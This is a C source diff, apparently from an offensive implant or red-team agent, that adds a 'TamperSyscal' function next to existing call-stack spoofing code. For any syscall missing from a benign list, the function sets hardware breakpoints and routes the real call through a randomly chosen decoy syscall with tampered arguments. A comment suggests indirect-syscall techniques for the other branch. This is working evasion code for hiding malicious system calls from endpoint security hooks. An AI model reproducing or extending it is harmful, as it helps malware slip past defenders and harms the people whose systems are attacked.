@@ -33,3 +33,60 @@ PVOID SpoofStack(
 
     return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
 }
+
+NTSTATUS TamperSyscal(
+    ULONG_PTR uAddress,
+    UINT Nargs,
+    ULONG_PTR a,
+    ULONG_PTR b,
+    ULONG_PTR c,
+    ULONG_PTR d,
+    ULONG_PTR e,
+    ULONG_PTR f,
+    ULONG_PTR g,
+    ULONG_PTR h,
+    ULONG_PTR i,
+    ULONG_PTR j,
+    ULONG_PTR k
+    ) {
+
+    DWORD SSN = 0x00;
+    SSN = FetchSSNFromSyscallEntriesViaAddress(uAddress);
+    BOOL BENIGN = FALSE;
+
+    NTSTATUS            NtStatus = 0x00;
+    t_NtDummyApi        pDummyApi = NULL;
+
+    for(int i = 0; i < g_BenignSyscallList->u32Count; i++) {
+        if(g_BenignSyscallList->Entries[i].SSN == SSN) {
+            BENIGN = TRUE;
+            break;
+        }
+    }
+
+    if(!BENIGN) {
+        if(!InitHardwareBreakpointHooking()) {
+            printf("[error] intializing hardware breakpoints\n");
+            return -1;
+        }
+
+        pDummyApi = (t_NtDummyApi)g_BenignSyscallList->Entries[GenerateRandomNumber() % g_BenignSyscallList->u32Count].uAddress;
+        if(!InitializeTamperedSyscall(pDummyApi, g_SyscallList->Entries[SSN].dw64Hash, Nargs, a, b, c, d, e, f, g, h, i, j, k)) {
+            return -1;
+        }
+        if((NtStatus = pDummyApi(NULL, NULL, NULL, NULL, NULL, NULL ,NULL , NULL, NULL, NULL, NULL)) != 0x00) {
+            printf("[!] 0x%llx Failed With Error: 0x%llx \n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
+            return NtStatus;
+        }
+
+        if(!HaltHardwareBreakpointHooking()) {
+            printf("[error] attempting to halt hardware breakpoints\n");
+            return -1;
+        }
+    } else { // FUNCTION IS UNHOOKED WHY BOTHER SETING HARDWARE BP & SPOOFING ARGS AT ALL?
+       //implement indirect syscall calling here such as hell's hall.
+    }
+
+
+    return NtStatus;
+}
